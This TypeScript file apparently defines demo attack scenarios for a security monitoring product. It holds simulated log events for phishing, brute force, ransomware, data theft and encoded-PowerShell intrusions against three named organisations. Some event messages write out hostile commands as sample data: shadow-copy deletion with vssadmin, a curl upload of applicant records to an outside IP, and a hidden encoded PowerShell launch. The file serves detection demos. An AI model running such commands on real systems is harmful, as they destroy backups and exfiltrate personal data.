import type { Action, ClientId, EventSource, RiskEvent, Severity } from '../engine/types';

export interface ScenarioEvent {
  /** seconds after the attack starts */
  at: number;
  source: EventSource;
  host?: string;
  user?: string;
  ip?: string;
  domain?: string;
  process?: string;
  action: string;
  message: string;
  meta?: Record<string, string | number | boolean>;
}

export interface Scenario {
  id: string;
  client: ClientId;
  title: string;
  severity: Severity;
  ruleId: string;
  summary: string;
  attackShort: string;
  attackNarrative: string;
  events: ScenarioEvent[];
  intel: string[];
  proposed: { action: Action; target: string };
  confidence: number;
  presenterLine: string;
  happened: string;
}

const brute = (host: string, users: string[], source: EventSource, msgFor: (u: string) => string): ScenarioEvent[] =>
  users.map((u, i) => ({ at: i * 4, source, host, user: u, ip: '1.2.3.4', action: 'login_failed', message: msgFor(u) }));

export const SCENARIOS: Scenario[] = [
  // ---------------- Meezan Bank ----------------
  {
    id: 'meezan_phish', client: 'meezan', title: 'Fake Bank Login Phishing', severity: 'HIGH', ruleId: 'rb-006',
    summary: 'A fake "MeezanBank" SMS sends a customer to a look-alike login page, then the attacker logs in with the stolen password.',
    attackShort: 'sent a fake bank SMS, harvested the customer\'s password on a look-alike site, and logged in through a proxy',
    attackNarrative: 'A spoofed SMS impersonating Meezan Bank lures customer.tariq to meezan-fake-login.com. The credentials are harvested and replayed through the proxy 203.0.113.88.',
    events: [
      { at: 0, source: 'proxy', host: 'gw-sms-01', user: 'customer.tariq', action: 'link_click', domain: 'meezan-fake-login.com', ip: '203.0.113.88', message: "Clicked link in SMS from 'MeezanBank'" },
      { at: 2, source: 'web', host: 'ibanking-web-02', user: 'customer.tariq', action: 'login_success', ip: '203.0.113.88', message: 'Login from untrusted proxy shortly after link click' },
    ],
    intel: ['meezan-fake-login.com', '203.0.113.88'], proposed: { action: 'reset_password', target: 'customer.tariq' }, confidence: 96,
    presenterLine: "An attacker targets Meezan Bank customers with fake SMS alerts. Riskbyte correlates the link click with an external login from an untrusted proxy, flags the known phishing domain, and prompts the analyst to reset the customer's credentials to prevent money theft.",
    happened: 'A customer got a fake text that looked like it came from Meezan Bank. They tapped the link and typed their password into a fake website. Seconds later, someone logged into their real account from a suspicious address. Riskbyte connected these two events, recognised the fake website, and asked an analyst to reset the customer\'s password before any money could move.',
  },
  {
    id: 'meezan_anomalous_login', client: 'meezan', title: 'Suspicious Overseas Staff Login', severity: 'HIGH', ruleId: 'rb-008',
    summary: 'A bank employee\'s VPN account suddenly logs in from a foreign address with no travel approval.',
    attackShort: 'used a stolen staff password to log into the core banking VPN from abroad',
    attackNarrative: 'Stolen credentials of staff.farooq are used on the core banking VPN from 198.51.100.99.',
    events: [
      { at: 0, source: 'vpn', host: 'vpn-core-01', user: 'staff.farooq', action: 'login_success', ip: '198.51.100.99', meta: { geo: 'Foreign (baseline: Karachi, PK)' }, message: 'VPN login from foreign geography; no travel authorization on file' },
    ],
    intel: ['198.51.100.99'], proposed: { action: 'disable_user', target: 'staff.farooq' }, confidence: 93,
    presenterLine: 'Staff credentials for core banking should never connect from untrusted foreign IPs. Riskbyte catches the geo-anomaly and the AI recommends disabling the account before the attacker reaches internal banking databases.',
    happened: 'A bank employee who always works from Karachi suddenly "logged in" from another country, with no travel on record. The address is also on our known-bad list. Riskbyte flagged it as a stolen password and suggested disabling the account until the employee is reached.',
  },
  {
    id: 'meezan_brute', client: 'meezan', title: 'Internet Banking Brute Force', severity: 'MEDIUM', ruleId: 'rb-001',
    summary: 'A botnet tries password after password against the internet banking login page.',
    attackShort: 'fired rapid password guesses at the internet banking login from one address',
    attackNarrative: 'A botnet guesses passwords on the internet banking portal from 1.2.3.4, rotating through usernames.',
    events: brute('ibanking-web-01', ['admin', 'customer.ali', 'customer.sana', 'customer.omar', 'customer.hira', 'customer.zain'], 'web', (u) => `Failed login for ${u} on internet banking`),
    intel: ['1.2.3.4'], proposed: { action: 'block_ip', target: '1.2.3.4' }, confidence: 88,
    presenterLine: 'Automated credential stuffing exhausts web servers and endangers customer accounts. Riskbyte aggregates failed logins across web frontends and proposes a firewall block at the perimeter.',
    happened: 'One address tried to log into six different banking accounts within half a minute, failing every time. That is a machine guessing passwords, not a person. Riskbyte counted the failures and suggested blocking that address at the bank\'s firewall.',
  },
  {
    id: 'meezan_transfer', client: 'meezan', title: 'Raast Payment Settlement Anomaly', severity: 'CRITICAL', ruleId: 'rb-010',
    summary: 'A huge batch payment leaves through Raast at 3 AM to an unknown external beneficiary.',
    attackShort: 'pushed a 500,000 USD-equivalent batch payment through Raast at 3 AM to an outside account',
    attackNarrative: 'An off-hours batch transfer (500,000 USD equivalent) goes through the Raast gateway to external 198.51.100.44.',
    events: [
      { at: 0, source: 'payments', host: 'raast-gw-01', user: 'ops.batch', action: 'transfer', ip: '198.51.100.44', meta: { amount: 500000, hour: 3, currency: 'USD-equivalent' }, message: 'Batch settlement to external beneficiary at 03:12 local time' },
    ],
    intel: ['198.51.100.44'], proposed: { action: 'disable_user', target: 'ops.batch' }, confidence: 94,
    presenterLine: "Raast payments settle immediately, so fraud cannot be reversed once cleared. Riskbyte's financial anomaly rule detects the unusual off-hours transfer and alerts the analyst to freeze it before clearance.",
    happened: 'In the middle of the night, a very large payment was about to leave the bank to an outside account linked to a known-bad address. Raast payments are instant and cannot be pulled back. Riskbyte raised a Critical alert and suggested freezing the operator account (and holding the batch) until someone checks it.',
  },
  // ---------------- Salim Habib University ----------------
  {
    id: 'shu_phish', client: 'shu', title: 'Admissions & Faculty Phishing', severity: 'HIGH', ruleId: 'rb-006',
    summary: 'A fake "Registrar" email tricks a faculty member, and their LMS account is used from outside minutes later.',
    attackShort: 'sent a fake Registrar email, stole a faculty password, and logged into the LMS from outside',
    attackNarrative: 'An email posing as the SHU Registrar lures faculty.ahmed to shu-admissions-phish.com.',
    events: [
      { at: 0, source: 'proxy', host: 'shu-mail-gw', user: 'faculty.ahmed', action: 'link_click', domain: 'shu-admissions-phish.com', ip: '203.0.113.77', message: "Clicked link in email 'Admissions update'" },
      { at: 2, source: 'web', host: 'lms-web-01', user: 'faculty.ahmed', action: 'login_success', ip: '203.0.113.77', message: 'Login from untrusted address after link click' },
    ],
    intel: ['shu-admissions-phish.com'], proposed: { action: 'reset_password', target: 'faculty.ahmed' }, confidence: 95,
    presenterLine: 'Faculty accounts are prime targets because they hold exam papers and grades. Riskbyte intercepts the click, matches the fake domain, and enables immediate password revocation.',
    happened: 'A teacher received an email that looked like it came from the Registrar and clicked the link. Moments later, their LMS account was opened from an unknown outside address. Riskbyte recognised the fake website and asked for the teacher\'s password to be reset, protecting grades and exam papers.',
  },
  {
    id: 'shu_brute', client: 'shu', title: 'Admissions Portal Brute Force', severity: 'MEDIUM', ruleId: 'rb-001',
    summary: 'An automated scanner hammers the admissions portal admin login during admission season.',
    attackShort: 'ran an automated password-guessing attack against the admissions portal admin account',
    attackNarrative: 'A scanner at 1.2.3.4 guesses the admin password on admissions-web-01.',
    events: brute('admissions-web-01', ['admin', 'admin', 'admin', 'admin', 'admin', 'admin'], 'web', () => 'Failed login for admin on admissions portal'),
    intel: ['1.2.3.4'], proposed: { action: 'block_ip', target: '1.2.3.4' }, confidence: 87,
    presenterLine: 'During admission season, universities face heavy automated scans. Riskbyte flags the dictionary attack and blocks the scanner at the campus boundary.',
    happened: 'One address tried to log into the admissions portal\'s admin account six times in under half a minute. Riskbyte recognised a password-guessing machine and suggested blocking it at the campus firewall.',
  },
  {
    id: 'shu_ransomware', client: 'shu', title: 'Lab PC Ransomware & Shadow Deletion', severity: 'CRITICAL', ruleId: 'rb-007',
    summary: 'A fake "free tool" on a lab PC deletes Windows backups and starts encrypting files.',
    attackShort: 'tricked a student into running a fake installer that wiped backups and started encrypting files',
    attackNarrative: 'A trojanized download on lab-pc-18 deletes shadow copies and begins bulk file encryption.',
    events: [
      { at: 0, source: 'endpoint', host: 'lab-pc-18', user: 'student.lab18', process: 'setup_free_tool.exe', action: 'process_start', message: 'Installer launched from Downloads' },
      { at: 2, source: 'endpoint', host: 'lab-pc-18', user: 'student.lab18', process: 'vssadmin.exe', action: 'process_start', message: 'vssadmin delete shadows /all /quiet' },
      { at: 4, source: 'endpoint', host: 'lab-pc-18', user: 'student.lab18', process: 'setup_free_tool.exe', action: 'file_rename_bulk', meta: { count: 1840 }, message: '1,840 files renamed with a new extension in 20 seconds' },
      { at: 5, source: 'gateway', host: 'lab-pc-18', action: 'dns_query', domain: 'ransomware-c2.net', message: 'DNS lookup for ransomware-c2.net' },
    ],
    intel: ['ransomware-c2.net'], proposed: { action: 'isolate_host', target: 'lab-pc-18' }, confidence: 98,
    presenterLine: 'Student lab computers are vulnerable to malware. When ransomware deletes Windows shadow backups and starts encrypting files, Riskbyte raises a Critical alert and isolates the computer to stop it spreading.',
    happened: 'A student ran a "free tool" that was actually ransomware. It deleted the computer\'s backups, scrambled 1,840 files, and contacted a known ransomware server. Riskbyte raised a Critical alert and suggested cutting the PC off the network so it cannot spread to other lab machines.',
  },
  {
    id: 'shu_data_export', client: 'shu', title: 'Applicant Document Data Exfiltration', severity: 'HIGH', ruleId: 'rb-009',
    summary: 'A 2.4 GB archive of applicant records is uploaded from the admissions server to an unknown address.',
    attackShort: 'zipped 2.4 GB of applicant records and uploaded them to an outside server',
    attackNarrative: 'applicants_2026.zip (2.4 GB) is uploaded with curl from admissions-web-01 to 198.51.100.44.',
    events: [
      { at: 0, source: 'endpoint', host: 'admissions-web-01', process: 'curl', action: 'net_upload', ip: '198.51.100.44', meta: { bytes: 2576980377 }, message: 'curl -T applicants_2026.zip https://198.51.100.44/upload (2.4 GB)' },
    ],
    intel: ['198.51.100.44'], proposed: { action: 'isolate_host', target: 'admissions-web-01' }, confidence: 94,
    presenterLine: "Admissions servers store applicant CNIC copies and personal records. Riskbyte detects the bulk outbound transfer to an untrusted IP and prompts the analyst to cut the server's connection.",
    happened: 'The admissions server started sending a 2.4 GB file of applicant records (including ID card copies) to an unknown outside address. Riskbyte spotted the large upload to a known-bad destination and suggested disconnecting the server to stop the leak.',
  },
  // ---------------- Contour Software ----------------
  {
    id: 'contour_malware', client: 'contour', title: 'Encoded PowerShell on Dev Laptop', severity: 'HIGH', ruleId: 'rb-002',
    summary: 'A hidden, encoded PowerShell command runs on a developer laptop and calls out to an attacker server.',
    attackShort: 'ran a hidden, encoded PowerShell command on a developer laptop that phoned home to a control server',
    attackNarrative: 'Encoded PowerShell runs hidden on dev-ws-042, then connects out to 198.51.100.99.',
    events: [
      { at: 0, source: 'endpoint', host: 'dev-ws-042', user: 'dev.hamza', process: 'powershell.exe', action: 'process_start', message: 'powershell.exe -NoProfile -WindowStyle Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQ==' },
      { at: 2, source: 'endpoint', host: 'dev-ws-042', user: 'dev.hamza', process: 'powershell.exe', action: 'net_connect', ip: '198.51.100.99', message: 'Outbound connection to 198.51.100.99:443' },
    ],
    intel: ['198.51.100.99'], proposed: { action: 'isolate_host', target: 'dev-ws-042' }, confidence: 95,
    presenterLine: 'Attackers use encoded PowerShell to hide in memory on developer machines. Riskbyte flags the evasion technique, checks the C2 address, and isolates the laptop so proprietary source code cannot be touched.',
    happened: 'A developer\'s laptop quietly ran a disguised PowerShell command and then connected to a known attacker server. Riskbyte flagged the obfuscation indicators (it does not decode the payload) and suggested isolating the laptop so the attacker cannot reach source code.',
  },
  {
    id: 'contour_ssh_brute', client: 'contour', title: 'SSH Brute Force on CI Build Server', severity: 'MEDIUM', ruleId: 'rb-001',
    summary: 'A scanner guesses the Jenkins service account password over SSH on the build server.',
    attackShort: 'hammered the CI build server\'s Jenkins account with SSH password guesses',
    attackNarrative: 'A scanner at 1.2.3.4 brute-forces jenkins_svc over SSH on ci-build-01.',
    events: brute('ci-build-01', Array(6).fill('jenkins_svc'), 'syslog', () => 'sshd: Failed password for jenkins_svc'),
    intel: ['1.2.3.4'], proposed: { action: 'block_ip', target: '1.2.3.4' }, confidence: 89,
    presenterLine: 'If an attacker breaches a CI/CD server, they can insert backdoors into customer releases. Riskbyte detects the brute-force sweep against the Jenkins account and locks the scanner out.',
    happened: 'Someone tried six SSH passwords for the build server\'s Jenkins account in under 30 seconds. If they got in, they could slip a backdoor into software shipped to customers. Riskbyte suggested blocking the scanner\'s address.',
  },
  {
    id: 'contour_vpn', client: 'contour', title: 'Suspicious Foreign VPN Login', severity: 'HIGH', ruleId: 'rb-008',
    summary: 'A Lahore-based developer\'s VPN account logs in from a foreign, known-bad address.',
    attackShort: 'logged into the corporate VPN from abroad with a developer\'s stolen password',
    attackNarrative: 'dev.bilal\'s VPN account connects from 198.51.100.99.',
    events: [
      { at: 0, source: 'vpn', host: 'vpn-gw-01', user: 'dev.bilal', action: 'login_success', ip: '198.51.100.99', meta: { geo: 'Foreign (baseline: Lahore, PK)' }, message: 'VPN login from untrusted foreign IP' },
    ],
    intel: ['198.51.100.99'], proposed: { action: 'disable_user', target: 'dev.bilal' }, confidence: 92,
    presenterLine: 'With hundreds of remote developers, stolen VPN credentials are a top threat. Riskbyte correlates location and untrusted IP ranges to quarantine the account before code servers are accessed.',
    happened: 'A developer who works from Lahore appeared to log into the company VPN from another country, from an address linked to attackers. Riskbyte suggested disabling the account before anyone reaches the code servers.',
  },
  {
    id: 'contour_code_download', client: 'contour', title: 'Off-Hours Source Code Repository Clone', severity: 'HIGH', ruleId: 'rb-009',
    summary: 'At 2:41 AM a service account pipes the core product repository to an external server.',
    attackShort: 'used a service account at 2:41 AM to pipe the core product\'s source code to an outside server',
    attackNarrative: 'svc.mirror runs git archive on enterprise-core.git and pipes it to 198.51.100.44.',
    events: [
      { at: 0, source: 'git', host: 'git-srv-01', user: 'svc.mirror', process: 'git', action: 'net_upload', ip: '198.51.100.44', meta: { hour: 2, bytes: 1181116006 }, message: 'git archive enterprise-core.git piped to external host 198.51.100.44 at 02:41' },
    ],
    intel: ['198.51.100.44'], proposed: { action: 'isolate_host', target: 'git-srv-01' }, confidence: 94,
    presenterLine: "Source code is Contour's core intellectual property. When an off-hours script mass-exports repositories to an external IP, Riskbyte detects the exfiltration pattern and isolates the staging server.",
    happened: 'In the middle of the night, about 1.1 GB of Contour\'s main product source code was being copied to an outside address. Riskbyte recognised the bulk export to a known-bad destination and suggested cutting off the Git server.',
  },
];

export const scenarioById = (id: string) => SCENARIOS.find((s) => s.id === id);
export const scenariosFor = (client: ClientId) => SCENARIOS.filter((s) => s.client === client);

/** Materialises scenario events with timestamps starting at `start`. */
export function scenarioEvents(s: Scenario, start = Date.now(), origin: RiskEvent['origin'] = 'demo'): Partial<RiskEvent>[] {
  return s.events.map(({ at, ...rest }) => ({ ...rest, client: s.client, ts: new Date(start + at * 1000).toISOString(), origin }));
}
